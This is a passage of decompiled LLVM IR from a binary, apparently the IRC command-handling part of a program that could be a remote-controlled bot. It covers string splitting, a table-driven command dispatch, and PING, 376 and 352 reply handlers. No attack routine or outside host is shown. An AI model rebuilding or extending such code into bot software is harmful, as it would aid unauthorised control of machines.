  store i32 %v1_10001540, i32* %r3.global-to-local, align 4
  store i32 268441032, i32* @lr, align 4
  %v4_100015c4 = call i32 @strwildmatch(i8* %v5_10001544, i32 %v3_100015b8, i32 268566528)
  store i32 %v4_100015c4, i32* %r3.global-to-local, align 4
  %v3_100015cc = icmp eq i32 %v4_100015c4, 0
  br i1 %v3_100015cc, label %dec_label_pc_100015d4, label %dec_label_pc_10001940

dec_label_pc_100015d4:                            ; preds = %dec_label_pc_10001598
  %v1_100015e0 = add i32 %v2_100015a4, 1
  store i32 %v1_100015e0, i32* @r3, align 4
  %v0_100015ec = call i32 @__GI_strlen()
  store i32 %v0_100015ec, i32* %r3.global-to-local, align 4
  store i32 %v0_100015ec, i32* %stack_var_-1144, align 4
  %stack_var_-1136.040 = inttoptr i32 %v1_100015e0 to i8*
  %v2_1000166842 = icmp sgt i32 %v0_100015ec, 0
  br i1 %v2_1000166842, label %dec_label_pc_10001604.lr.ph, label %dec_label_pc_100016b4.preheader

dec_label_pc_10001604.lr.ph:                      ; preds = %dec_label_pc_100015d4
  %v2_1000163c = ptrtoint i32* %stack_var_-1144 to i32
  %v2_10001640 = add i32 %v2_1000163c, 68
  br label %dec_label_pc_10001604

dec_label_pc_10001604:                            ; preds = %dec_label_pc_10001604.lr.ph, %dec_label_pc_1000162c
  %stack_var_-1136.047 = phi i8* [ %stack_var_-1136.040, %dec_label_pc_10001604.lr.ph ], [ %stack_var_-1136.0, %dec_label_pc_1000162c ]
  %storemerge1146 = phi i32 [ 0, %dec_label_pc_10001604.lr.ph ], [ %v1_10001658, %dec_label_pc_1000162c ]
  %stack_var_-1136.0.in45 = phi i32 [ %v1_100015e0, %dec_label_pc_10001604.lr.ph ], [ %v1_1000164c, %dec_label_pc_1000162c ]
  %v2_10001608 = load i8, i8* %stack_var_-1136.047, align 1
  %v3_10001610 = icmp eq i8 %v2_10001608, 32
  br i1 %v3_10001610, label %dec_label_pc_100016b4.preheader, label %dec_label_pc_10001618

dec_label_pc_10001618:                            ; preds = %dec_label_pc_10001604
  %v2_1000161c = load i8, i8* %stack_var_-1136.047, align 1
  %v3_10001624 = icmp eq i8 %v2_1000161c, 0
  br i1 %v3_10001624, label %dec_label_pc_100016b4.preheader, label %dec_label_pc_1000162c

dec_label_pc_1000162c:                            ; preds = %dec_label_pc_10001618
  %v2_10001634 = load i8, i8* %stack_var_-1136.047, align 1
  %v3_10001644 = add i32 %v2_10001640, %storemerge1146
  %v4_10001644 = inttoptr i32 %v3_10001644 to i8*
  store i8 %v2_10001634, i8* %v4_10001644, align 1
  %v1_1000164c = add i32 %stack_var_-1136.0.in45, 1
  %v1_10001658 = add i32 %storemerge1146, 1
  %stack_var_-1136.0 = inttoptr i32 %v1_1000164c to i8*
  %v3_10001664 = load i32, i32* %stack_var_-1144, align 4
  %v2_10001668 = icmp slt i32 %v1_10001658, %v3_10001664
  br i1 %v2_10001668, label %dec_label_pc_10001604, label %dec_label_pc_100016b4.preheader

dec_label_pc_100016b4.preheader:                  ; preds = %dec_label_pc_1000162c, %dec_label_pc_10001604, %dec_label_pc_10001618, %dec_label_pc_100015d4
  %stack_var_-1136.0.in.lcssa = phi i32 [ %v1_100015e0, %dec_label_pc_100015d4 ], [ %v1_1000164c, %dec_label_pc_1000162c ], [ %stack_var_-1136.0.in45, %dec_label_pc_10001604 ], [ %stack_var_-1136.0.in45, %dec_label_pc_10001618 ]
  %stack_var_-1136.0.lcssa = phi i8* [ %stack_var_-1136.040, %dec_label_pc_100015d4 ], [ %stack_var_-1136.0, %dec_label_pc_1000162c ], [ %stack_var_-1136.047, %dec_label_pc_10001604 ], [ %stack_var_-1136.047, %dec_label_pc_10001618 ]
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 %stack_var_-1136.0.in.lcssa, i32* @r3, align 4
  %v0_100016bc32 = call i32 @__GI_strlen()
  store i32 %v0_100016bc32, i32* %r3.global-to-local, align 4
  %v0_100016c433 = load i32, i32* %r29.global-to-local, align 4
  %v2_100016c434 = icmp ult i32 %v0_100016c433, %v0_100016bc32
  br i1 %v2_100016c434, label %dec_label_pc_1000167c, label %dec_label_pc_100016cc

dec_label_pc_1000167c:                            ; preds = %dec_label_pc_100016b4.preheader, %dec_label_pc_100016a8
  %storemerge1238 = phi i32 [ %v1_100016ac, %dec_label_pc_100016a8 ], [ 0, %dec_label_pc_100016b4.preheader ]
  %stack_var_-1140.137 = phi i32 [ %stack_var_-1140.0, %dec_label_pc_100016a8 ], [ 0, %dec_label_pc_100016b4.preheader ]
  %v2_10001688 = add i32 %storemerge1238, %stack_var_-1136.0.in.lcssa
  %v1_1000168c = inttoptr i32 %v2_10001688 to i8*
  %v2_1000168c = load i8, i8* %v1_1000168c, align 1
  %v3_10001694 = icmp eq i8 %v2_1000168c, 32
  br i1 %v3_10001694, label %dec_label_pc_1000169c, label %dec_label_pc_100016a8

dec_label_pc_1000169c:                            ; preds = %dec_label_pc_1000167c
  %v1_100016a0 = add i32 %stack_var_-1140.137, 1
  br label %dec_label_pc_100016a8

dec_label_pc_100016a8:                            ; preds = %dec_label_pc_1000167c, %dec_label_pc_1000169c
  %stack_var_-1140.0 = phi i32 [ %v1_100016a0, %dec_label_pc_1000169c ], [ %stack_var_-1140.137, %dec_label_pc_1000167c ]
  %v1_100016ac = add i32 %storemerge1238, 1
  store i32 %v1_100016ac, i32* %r29.global-to-local, align 4
  store i32 %stack_var_-1136.0.in.lcssa, i32* @r3, align 4
  %v0_100016bc = call i32 @__GI_strlen()
  store i32 %v0_100016bc, i32* %r3.global-to-local, align 4
  %v0_100016c4 = load i32, i32* %r29.global-to-local, align 4
  %v2_100016c4 = icmp ult i32 %v0_100016c4, %v0_100016bc
  br i1 %v2_100016c4, label %dec_label_pc_1000167c, label %dec_label_pc_100016cc

dec_label_pc_100016cc:                            ; preds = %dec_label_pc_100016a8, %dec_label_pc_100016b4.preheader
  %stack_var_-1140.1.lcssa = phi i32 [ 0, %dec_label_pc_100016b4.preheader ], [ %stack_var_-1140.0, %dec_label_pc_100016a8 ]
  %v1_100016d0 = add i32 %stack_var_-1140.1.lcssa, 1
  %tmp102 = icmp slt i32 %v1_100016d0, 11
  br i1 %tmp102, label %dec_label_pc_100016ec, label %dec_label_pc_100016e4

dec_label_pc_100016e4:                            ; preds = %dec_label_pc_100016cc
  br label %dec_label_pc_100016ec

dec_label_pc_100016ec:                            ; preds = %dec_label_pc_100016cc, %dec_label_pc_100016e4
  %stack_var_-1140.2 = phi i32 [ %v1_100016d0, %dec_label_pc_100016cc ], [ 10, %dec_label_pc_100016e4 ]
  %v1_100016f8 = mul i32 %stack_var_-1140.2, 4
  %v2_10001700 = ptrtoint i32* %stack_var_-1144 to i32
  %v2_10001704 = add i32 %v2_10001700, 24
  %v1_10001708 = add i32 %v2_10001704, %v1_100016f8
  %v2_10001714 = inttoptr i32 %v1_10001708 to i32*
  store i32 ptrtoint (i32* @global_var_1000b8ac.290 to i32), i32* %v2_10001714, align 4
  store i32 1, i32* %stack_var_-1144, align 4
  %v2_1000183827 = load i8, i8* %stack_var_-1136.0.lcssa, align 1
  %v3_1000184030 = icmp eq i8 %v2_1000183827, 0
  br i1 %v3_1000184030, label %dec_label_pc_10001848, label %dec_label_pc_10001724.lr.ph

dec_label_pc_10001724.lr.ph:                      ; preds = %dec_label_pc_100016ec
  %v4_1000183426 = ptrtoint i8* %stack_var_-1136.0.lcssa to i32
  %v2_100017b4 = add i32 %v2_10001700, 20
  br label %dec_label_pc_10001724

dec_label_pc_10001724:                            ; preds = %dec_label_pc_10001724.lr.ph, %dec_label_pc_10001790
  %v3_10001730 = phi i32 [ 1, %dec_label_pc_10001724.lr.ph ], [ %v1_10001818, %dec_label_pc_10001790 ]
  %v4_1000183431 = phi i32 [ %v4_1000183426, %dec_label_pc_10001724.lr.ph ], [ %v2_1000182c, %dec_label_pc_10001790 ]
  %v1_10001728 = add i32 %v4_1000183431, 1
  %v2_10001738 = icmp slt i32 %v3_10001730, %stack_var_-1140.2
  br i1 %v2_10001738, label %dec_label_pc_10001758.preheader, label %dec_label_pc_10001848

dec_label_pc_10001758.preheader:                  ; preds = %dec_label_pc_10001724
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 %v1_10001728, i32* @r3, align 4
  %v0_1000176019 = call i32 @__GI_strlen()
  store i32 %v0_1000176019, i32* %r3.global-to-local, align 4
  %v0_1000176820 = load i32, i32* %r29.global-to-local, align 4
  %v2_1000176821 = icmp ult i32 %v0_1000176820, %v0_1000176019
  br i1 %v2_1000176821, label %dec_label_pc_10001770, label %dec_label_pc_10001790

dec_label_pc_1000174c:                            ; preds = %dec_label_pc_10001770
  %v1_10001750 = add i32 %storemerge1424, 1
  store i32 %v1_10001750, i32* %r29.global-to-local, align 4
  store i32 %v1_10001728, i32* @r3, align 4
  %v0_10001760 = call i32 @__GI_strlen()
  store i32 %v0_10001760, i32* %r3.global-to-local, align 4
  %v0_10001768 = load i32, i32* %r29.global-to-local, align 4
  %v2_10001768 = icmp ult i32 %v0_10001768, %v0_10001760
  br i1 %v2_10001768, label %dec_label_pc_10001770, label %dec_label_pc_10001790

dec_label_pc_10001770:                            ; preds = %dec_label_pc_10001758.preheader, %dec_label_pc_1000174c
  %storemerge1424 = phi i32 [ %v1_10001750, %dec_label_pc_1000174c ], [ 0, %dec_label_pc_10001758.preheader ]
  %v2_1000177c = add i32 %storemerge1424, %v1_10001728
  %v1_10001780 = inttoptr i32 %v2_1000177c to i8*
  %v2_10001780 = load i8, i8* %v1_10001780, align 1
  %v3_10001788 = icmp eq i8 %v2_10001780, 32
  br i1 %v3_10001788, label %dec_label_pc_10001790, label %dec_label_pc_1000174c

dec_label_pc_10001790:                            ; preds = %dec_label_pc_1000174c, %dec_label_pc_10001770, %dec_label_pc_10001758.preheader
  %storemerge14.lcssa = phi i32 [ 0, %dec_label_pc_10001758.preheader ], [ %v1_10001750, %dec_label_pc_1000174c ], [ %storemerge1424, %dec_label_pc_10001770 ]
  %v3_10001790 = load i32, i32* %stack_var_-1144, align 4
  store i32 %v3_10001790, i32* @r29, align 4
  %v1_10001798 = add i32 %storemerge14.lcssa, 1
  store i32 %v1_10001798, i32* @r3, align 4
  store i32 268441508, i32* @lr, align 4
  %v0_100017a0 = call i32 @malloc()
  store i32 %v0_100017a0, i32* %r3.global-to-local, align 4
  %v0_100017ac = load i32, i32* @r29, align 4
  %v1_100017ac = mul i32 %v0_100017ac, 4
  %v1_100017b8 = add i32 %v1_100017ac, %v2_100017b4
  %v2_100017bc = inttoptr i32 %v1_100017b8 to i32*
  store i32 %v0_100017a0, i32* %v2_100017bc, align 4
  %v3_100017c0 = load i32, i32* %stack_var_-1144, align 4
  %v1_100017c4 = mul i32 %v3_100017c0, 4
  %v1_100017d0 = add i32 %v1_100017c4, %v2_100017b4
  %v1_100017d4 = inttoptr i32 %v1_100017d0 to i32*
  %v2_100017d4 = load i32, i32* %v1_100017d4, align 4
  store i32 %v2_100017d4, i32* %r3.global-to-local, align 4
  store i32 %v1_10001728, i32* @r4, align 4
  store i32 268441580, i32* @lr, align 4
  %v3_100017e8 = call i32 @strncpy(i32 %v2_100017d4, i32 %v1_10001728, i32 %storemerge14.lcssa)
  store i32 %v3_100017e8, i32* %r3.global-to-local, align 4
  %v3_100017ec = load i32, i32* %stack_var_-1144, align 4
  %v1_100017f0 = mul i32 %v3_100017ec, 4
  %v1_100017fc = add i32 %v1_100017f0, %v2_100017b4
  %v1_10001800 = inttoptr i32 %v1_100017fc to i32*
  %v2_10001800 = load i32, i32* %v1_10001800, align 4
  %v2_10001808 = add i32 %v2_10001800, %storemerge14.lcssa
  %v3_10001810 = inttoptr i32 %v2_10001808 to i8*
  store i8 0, i8* %v3_10001810, align 1
  %v3_10001814 = load i32, i32* %stack_var_-1144, align 4
  %v1_10001818 = add i32 %v3_10001814, 1
  store i32 %v1_10001818, i32* %stack_var_-1144, align 4
  %v2_1000182c = add i32 %storemerge14.lcssa, %v1_10001728
  %v5_10001830 = inttoptr i32 %v2_1000182c to i8*
  %v2_10001838 = load i8, i8* %v5_10001830, align 1
  %v3_10001840 = icmp eq i8 %v2_10001838, 0
  br i1 %v3_10001840, label %dec_label_pc_10001848, label %dec_label_pc_10001724

dec_label_pc_10001848:                            ; preds = %dec_label_pc_10001790, %dec_label_pc_10001724, %dec_label_pc_100016ec
  store i32 0, i32* %stack_var_-1144, align 4
  %v2_10001934 = load i32, i32* bitcast ([4 x i8]** @global_var_1001d43c.291 to i32*), align 4
  %v3_10001938 = icmp eq i32 %v2_10001934, 0
  br i1 %v3_10001938, label %dec_label_pc_10001940, label %dec_label_pc_10001854

dec_label_pc_10001854:                            ; preds = %dec_label_pc_10001848
  store i32 %v2_10001934, i32* @r3, align 4
  store i32 %v2_1000151c, i32* @r4, align 4
  %v2_10001878 = call i32 @__GI_strcasecmp(i32 %v2_10001934, i32 %v2_1000151c)
  store i32 %v2_10001878, i32* %r3.global-to-local, align 4
  %v3_10001888 = load i32, i32* %stack_var_-1144, align 4
  %v1_10001894 = mul i32 %v3_10001888, 8
  %v1_1000189c = add i32 %v1_10001894, add (i32 ptrtoint ([4 x i8]** @global_var_1001d43c.291 to i32), i32 4)
  %v1_100018a0 = inttoptr i32 %v1_1000189c to i32*
  %v2_100018a0 = load i32, i32* %v1_100018a0, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  call void @__pseudo_call(i32 %v2_100018a0)
  %v2_1000190815 = icmp sgt i32 %stack_var_-1140.2, 1
  br i1 %v2_1000190815, label %dec_label_pc_100018d4.lr.ph, label %dec_label_pc_10001940

dec_label_pc_100018d4.lr.ph:                      ; preds = %dec_label_pc_10001854
  %v2_100018e0 = add i32 %v2_10001700, 20
  br label %dec_label_pc_100018d4

dec_label_pc_100018d4:                            ; preds = %dec_label_pc_100018d4.lr.ph, %dec_label_pc_100018d4
  %storemerge1318 = phi i32 [ 1, %dec_label_pc_100018d4.lr.ph ], [ %v1_100018f8, %dec_label_pc_100018d4 ]
  %v1_100018d8 = mul i32 %storemerge1318, 4
  %v1_100018e4 = add i32 %v2_100018e0, %v1_100018d8
  %v1_100018e8 = inttoptr i32 %v1_100018e4 to i32*
  %v2_100018e8 = load i32, i32* %v1_100018e8, align 4
  store i32 %v2_100018e8, i32* @r3, align 4
  store i32 268441844, i32* @lr, align 4
  %v0_100018f0 = call i32 @free()
  store i32 %v0_100018f0, i32* %r3.global-to-local, align 4
  %v1_100018f8 = add nuw nsw i32 %storemerge1318, 1
  %v2_10001908 = icmp slt i32 %v1_100018f8, %stack_var_-1140.2
  br i1 %v2_10001908, label %dec_label_pc_100018d4, label %dec_label_pc_10001940

dec_label_pc_10001940:                            ; preds = %dec_label_pc_100018d4, %dec_label_pc_10001854, %dec_label_pc_10001848, %dec_label_pc_10001598, %dec_label_pc_100014fc, %dec_label_pc_100014d0
  %v2_10001940 = load i32, i32* %stack_var_-1152, align 4
  %v1_1000194c = add i32 %v2_10001940, -12
  %v2_1000194c = inttoptr i32 %v1_1000194c to i32*
  %v3_1000194c = load i32, i32* %v2_1000194c, align 4
  store i32 %v3_1000194c, i32* %r29.global-to-local, align 4
  %v0_10001958 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10001958

; uselistorder directives
  uselistorder i32 %storemerge1318, { 1, 0 }
  uselistorder i32 %v2_10001934, { 1, 0, 2 }
  uselistorder i32 %v2_1000182c, { 1, 0 }
  uselistorder i32 %v1_10001818, { 1, 0 }
  uselistorder i32 %storemerge14.lcssa, { 0, 1, 3, 2 }
  uselistorder i32 %v1_10001728, { 0, 3, 4, 1, 5, 2 }
  uselistorder i32 %v2_10001700, { 2, 1, 0 }
  uselistorder i32 %stack_var_-1140.2, { 3, 1, 2, 0 }
  uselistorder i32 %v1_100016ac, { 1, 0 }
  uselistorder i32 %stack_var_-1140.137, { 1, 0 }
  uselistorder i32 %storemerge1238, { 1, 0 }
  uselistorder i8* %stack_var_-1136.0.lcssa, { 1, 0 }
  uselistorder i32 %stack_var_-1136.0.in.lcssa, { 2, 0, 1 }
  uselistorder i32 %storemerge1146, { 1, 0 }
  uselistorder i32 %v1_10001540, { 3, 0, 1, 4, 2, 5 }
  uselistorder i32 %v2_1000151c, { 1, 0, 3, 2 }
  uselistorder i32 %v2_10001454, { 1, 0, 2 }
  uselistorder i32* %stack_var_-1144, { 0, 1, 2, 3, 4, 5, 6, 7, 10, 8, 11, 9 }
  uselistorder i32* %r3.global-to-local, { 19, 1, 2, 3, 4, 5, 6, 7, 22, 8, 17, 9, 10, 11, 12, 18, 13, 14, 15, 20, 16, 21, 0 }
  uselistorder i32* %r29.global-to-local, { 0, 1, 2, 19, 20, 3, 4, 11, 12, 5, 6, 13, 14, 7, 8, 15, 16, 9, 10, 17, 18 }
  uselistorder i32 %arg3, { 4, 3, 0, 1, 5, 2 }
  uselistorder i32 %arg2, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_100018d4, { 1, 0 }
  uselistorder label %dec_label_pc_10001790, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10001770, { 1, 0 }
  uselistorder label %dec_label_pc_10001724, { 1, 0 }
  uselistorder label %dec_label_pc_100016ec, { 1, 0 }
  uselistorder label %dec_label_pc_100016a8, { 1, 0 }
  uselistorder label %dec_label_pc_1000167c, { 1, 0 }
  uselistorder label %dec_label_pc_100016b4.preheader, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_10001604, { 1, 0 }
  uselistorder label %dec_label_pc_10001598, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10001578, { 1, 0 }
  uselistorder label %dec_label_pc_100014d0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100014b0, { 1, 0 }
  uselistorder label %dec_label_pc_10001448, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10001428, { 1, 0 }
}

define i32 @_376(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v3_10001980 = load i32, i32* @global_var_1001d834.289, align 4
  %v5_10001998 = load i32, i32* @r7, align 4
  %v6_10001998 = call i32 @Send(i32 %arg1, i32 ptrtoint ([15 x i8]* @global_var_1000b8b0.293 to i32), i32 %v3_10001980, i32 268500992, i32 %v5_10001998)
  %v3_100019a0 = load i32, i32* @global_var_1001d84c.277, align 4
  %v3_100019a8 = load i32, i32* @global_var_1001d848.294, align 4
  %v6_100019c4 = call i32 @Send(i32 %arg1, i32 ptrtoint ([13 x i8]* @global_var_1000b8c0.295 to i32), i32 %v3_100019a0, i32 %v3_100019a8, i32 268500992)
  %v3_100019cc = load i32, i32* @global_var_1001d834.289, align 4
  %v5_100019e4 = load i32, i32* @r7, align 4
  %v6_100019e4 = call i32 @Send(i32 %arg1, i32 ptrtoint ([8 x i8]* @global_var_1000b8d0.296 to i32), i32 %v3_100019cc, i32 268500992, i32 %v5_100019e4)
  ret i32 %v6_100019e4
}

define i32 @_PING(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v5_10001a34 = load i32, i32* @r7, align 4
  %v6_10001a34 = call i32 @Send(i32 %arg1, i32 ptrtoint ([9 x i8]* @global_var_1000b8d8.297 to i32), i32 %arg3, i32 268500992, i32 %v5_10001a34)
  ret i32 %v6_10001a34
}

define i32 @_352(i32 %arg1, i32 %arg2, i8* %arg3) local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg3 to i32
  %stack_var_-56 = alloca i8, align 1
  %stack_var_-80 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_10001a50 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_10001a50, i32* %stack_var_-80, align 4
  br label %dec_label_pc_10001aa8.preheader

dec_label_pc_10001a90:                            ; preds = %dec_label_pc_10001ac0
  %v4_10001ac0 = ptrtoint i8* %stack_var_-68.058 to i32
  %v1_10001a94 = add i32 %v4_10001ac0, 1
  %v5_10001a98 = inttoptr i32 %v1_10001a94 to i8*
  %v1_10001aa0 = add i32 %stack_var_-60.057, 1
  store i32 %v1_10001aa0, i32* %r29.global-to-local, align 4
  store i32 %tmp, i32* @r3, align 4
  %v0_10001ab0 = call i32 @__GI_strlen()
  %v0_10001ab8 = load i32, i32* %r29.global-to-local, align 4
  %v2_10001ab8 = icmp ult i32 %v0_10001ab8, %v0_10001ab0
  br i1 %v2_10001ab8, label %dec_label_pc_10001ac0, label %dec_label_pc_10001ad4

dec_label_pc_10001ac0:                            ; preds = %dec_label_pc_10001aa8.preheader, %dec_label_pc_10001a90
  %stack_var_-68.058 = phi i8* [ %v5_10001a98, %dec_label_pc_10001a90 ], [ %stack_var_-68.164, %dec_label_pc_10001aa8.preheader ]
  %stack_var_-60.057 = phi i32 [ %v1_10001aa0, %dec_label_pc_10001a90 ], [ %stack_var_-60.163, %dec_label_pc_10001aa8.preheader ]
  %v2_10001ac4 = load i8, i8* %stack_var_-68.058, align 1
  %v3_10001acc = icmp eq i8 %v2_10001ac4, 32
  br i1 %v3_10001acc, label %dec_label_pc_10001ad4, label %dec_label_pc_10001a90

dec_label_pc_10001ad4:                            ; preds = %dec_label_pc_10001a90, %dec_label_pc_10001ac0, %dec_label_pc_10001aa8.preheader
  %stack_var_-60.0.lcssa = phi i32 [ %stack_var_-60.163, %dec_label_pc_10001aa8.preheader ], [ %v1_10001aa0, %dec_label_pc_10001a90 ], [ %stack_var_-60.057, %dec_label_pc_10001ac0 ]
  %stack_var_-68.0.lcssa = phi i8* [ %stack_var_-68.164, %dec_label_pc_10001aa8.preheader ], [ %v5_10001a98, %dec_label_pc_10001a90 ], [ %stack_var_-68.058, %dec_label_pc_10001ac0 ]
  %v4_10001ad4 = ptrtoint i8* %stack_var_-68.0.lcssa to i32
  %v1_10001ad8 = add i32 %v4_10001ad4, 1
  store i32 %stack_var_-60.0.lcssa, i32* %r29.global-to-local, align 4
  store i32 %tmp, i32* @r3, align 4
  %v0_10001ae8 = call i32 @__GI_strlen()
  %v0_10001af0 = load i32, i32* %r29.global-to-local, align 4
  %v4_10001af0 = icmp eq i32 %v0_10001af0, %v0_10001ae8
  br i1 %v4_10001af0, label %dec_label_pc_10001d8c, label %dec_label_pc_10001af8

dec_label_pc_10001af8:                            ; preds = %dec_label_pc_10001ad4
  %v5_10001adc = inttoptr i32 %v1_10001ad8 to i8*
  %v1_10001afc = add nuw nsw i32 %storemerge965, 1
  %tmp92 = icmp slt i32 %v1_10001afc, 5
  br i1 %tmp92, label %dec_label_pc_10001aa8.preheader, label %dec_label_pc_10001b28.preheader

dec_label_pc_10001aa8.preheader:                  ; preds = %entry, %dec_label_pc_10001af8
  %storemerge965 = phi i32 [ 0, %entry ], [ %v1_10001afc, %dec_label_pc_10001af8 ]
  %stack_var_-68.164 = phi i8* [ %arg3, %entry ], [ %v5_10001adc, %dec_label_pc_10001af8 ]
  %stack_var_-60.163 = phi i32 [ 0, %entry ], [ %stack_var_-60.0.lcssa, %dec_label_pc_10001af8 ]
  store i32 %stack_var_-60.163, i32* %r29.global-to-local, align 4
  store i32 %tmp, i32* @r3, align 4
  %v0_10001ab052 = call i32 @__GI_strlen()
  %v0_10001ab853 = load i32, i32* %r29.global-to-local, align 4
  %v2_10001ab854 = icmp ult i32 %v0_10001ab853, %v0_10001ab052
  br i1 %v2_10001ab854, label %dec_label_pc_10001ac0, label %dec_label_pc_10001ad4

dec_label_pc_10001b28.preheader:                  ; preds = %dec_label_pc_10001af8
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 %v1_10001ad8, i32* @r3, align 4
  %v0_10001b3042 = call i32 @__GI_strlen()
  %v0_10001b3843 = load i32, i32* %r29.global-to-local, align 4
  %v2_10001b3844 = icmp ult i32 %v0_10001b3843, %v0_10001b3042
  br i1 %v2_10001b3844, label %dec_label_pc_10001b40, label %dec_label_pc_10001b60

dec_label_pc_10001b1c:                            ; preds = %dec_label_pc_10001b40
  %v1_10001b20 = add i32 %storemerge1047, 1
  store i32 %v1_10001b20, i32* %r29.global-to-local, align 4
  store i32 %v1_10001ad8, i32* @r3, align 4
  %v0_10001b30 = call i32 @__GI_strlen()
  %v0_10001b38 = load i32, i32* %r29.global-to-local, align 4
  %v2_10001b38 = icmp ult i32 %v0_10001b38, %v0_10001b30
  br i1 %v2_10001b38, label %dec_label_pc_10001b40, label %dec_label_pc_10001b60

dec_label_pc_10001b40:                            ; preds = %dec_label_pc_10001b28.preheader, %dec_label_pc_10001b1c
  %storemerge1047 = phi i32 [ %v1_10001b20, %dec_label_pc_10001b1c ], [ 0, %dec_label_pc_10001b28.preheader ]
  %v2_10001b4c = add i32 %storemerge1047, %v1_10001ad8
  %v1_10001b50 = inttoptr i32 %v2_10001b4c to i8*
  %v2_10001b50 = load i8, i8* %v1_10001b50, align 1
  %v3_10001b58 = icmp eq i8 %v2_10001b50, 32
  br i1 %v3_10001b58, label %dec_label_pc_10001b60, label %dec_label_pc_10001b1c

dec_label_pc_10001b60:                            ; preds = %dec_label_pc_10001b1c, %dec_label_pc_10001b40, %dec_label_pc_10001b28.preheader
  %storemerge10.lcssa = phi i32 [ 0, %dec_label_pc_10001b28.preheader ], [ %v1_10001b20, %dec_label_pc_10001b1c ], [ %storemerge1047, %dec_label_pc_10001b40 ]
  %v2_10001b6c = add i32 %storemerge10.lcssa, %v1_10001ad8
  %v3_10001b74 = inttoptr i32 %v2_10001b6c to i8*
  store i8 0, i8* %v3_10001b74, align 1
  %v3_10001b7c = load i32, i32* @global_var_1001d834.289, align 4
  store i32 %v1_10001ad8, i32* @r3, align 4
  store i32 %v3_10001b7c, i32* @r4, align 4
  %v3_10001b88 = call i32 @__GI_strcasecmp(i32 %v1_10001ad8, i32 %v3_10001b7c)
  %v3_10001b90 = icmp eq i32 %v3_10001b88, 0
  br i1 %v3_10001b90, label %dec_label_pc_10001b98, label %dec_label_pc_10001d8c

dec_label_pc_10001b98:                            ; preds = %dec_label_pc_10001b60
  %v3_10001b9c = load i32, i32* @global_var_1001d820.298, align 4
  %v3_10001ba0 = icmp eq i32 %v3_10001b9c, 0
  br i1 %v3_10001ba0, label %dec_label_pc_10001ba8, label %dec_label_pc_10001d8c

dec_label_pc_10001ba8:                            ; preds = %dec_label_pc_10001b98
  br label %dec_label_pc_10001bdc.preheader

dec_label_pc_10001bc4:                            ; preds = %dec_label_pc_10001bf4
  %v4_10001bf4 = ptrtoint i8* %stack_var_-68.234 to i32
  %v1_10001bc8 = add i32 %v4_10001bf4, 1
  %v5_10001bcc = inttoptr i32 %v1_10001bc8 to i8*
  %v1_10001bd4 = add i32 %stack_var_-60.233, 1
  store i32 %v1_10001bd4, i32* %r29.global-to-local, align 4
  store i32 %tmp, i32* @r3, align 4
  %v0_10001be4 = call i32 @__GI_strlen()
  %v0_10001bec = load i32, i32* %r29.global-to-local, align 4
  %v2_10001bec = icmp ult i32 %v0_10001bec, %v0_10001be4
  br i1 %v2_10001bec, label %dec_label_pc_10001bf4, label %dec_label_pc_10001c08

dec_label_pc_10001bf4:                            ; preds = %dec_label_pc_10001bdc.preheader, %dec_label_pc_10001bc4
  %stack_var_-68.234 = phi i8* [ %v5_10001bcc, %dec_label_pc_10001bc4 ], [ %stack_var_-68.340, %dec_label_pc_10001bdc.preheader ]
  %stack_var_-60.233 = phi i32 [ %v1_10001bd4, %dec_label_pc_10001bc4 ], [ %stack_var_-60.339, %dec_label_pc_10001bdc.preheader ]
  %v2_10001bf8 = load i8, i8* %stack_var_-68.234, align 1
  %v3_10001c00 = icmp eq i8 %v2_10001bf8, 32
  br i1 %v3_10001c00, label %dec_label_pc_10001c08, label %dec_label_pc_10001bc4

dec_label_pc_10001c08:                            ; preds = %dec_label_pc_10001bc4, %dec_label_pc_10001bf4, %dec_label_pc_10001bdc.preheader
  %stack_var_-60.2.lcssa = phi i32 [ %stack_var_-60.339, %dec_label_pc_10001bdc.preheader ], [ %v1_10001bd4, %dec_label_pc_10001bc4 ], [ %stack_var_-60.233, %dec_label_pc_10001bf4 ]
  %stack_var_-68.2.lcssa = phi i8* [ %stack_var_-68.340, %dec_label_pc_10001bdc.preheader ], [ %v5_10001bcc, %dec_label_pc_10001bc4 ], [ %stack_var_-68.234, %dec_label_pc_10001bf4 ]
  %v4_10001c08 = ptrtoint i8* %stack_var_-68.2.lcssa to i32
  %v1_10001c0c = add i32 %v4_10001c08, 1
  store i32 %stack_var_-60.2.lcssa, i32* %r29.global-to-local, align 4
  store i32 %tmp, i32* @r3, align 4
  %v0_10001c1c = call i32 @__GI_strlen()
  %v0_10001c24 = load i32, i32* %r29.global-to-local, align 4
  %v4_10001c24 = icmp eq i32 %v0_10001c24, %v0_10001c1c
  br i1 %v4_10001c24, label %dec_label_pc_10001d8c, label %dec_label_pc_10001c2c

dec_label_pc_10001c2c:                            ; preds = %dec_label_pc_10001c08
  %v5_10001c10 = inttoptr i32 %v1_10001c0c to i8*
  %v1_10001c30 = add nuw nsw i32 %storemerge1141, 1
  %tmp93 = icmp slt i32 %v1_10001c30, 3
  br i1 %tmp93, label %dec_label_pc_10001bdc.preheader, label %dec_label_pc_10001c5c.preheader

dec_label_pc_10001bdc.preheader:                  ; preds = %dec_label_pc_10001ba8, %dec_label_pc_10001c2c
  %storemerge1141 = phi i32 [ 0, %dec_label_pc_10001ba8 ], [ %v1_10001c30, %dec_label_pc_10001c2c ]
  %stack_var_-68.340 = phi i8* [ %arg3, %dec_label_pc_10001ba8 ], [ %v5_10001c10, %dec_label_pc_10001c2c ]
  %stack_var_-60.339 = phi i32 [ 0, %dec_label_pc_10001ba8 ], [ %stack_var_-60.2.lcssa, %dec_label_pc_10001c2c ]
  store i32 %stack_var_-60.339, i32* %r29.global-to-local, align 4
  store i32 %tmp, i32* @r3, align 4
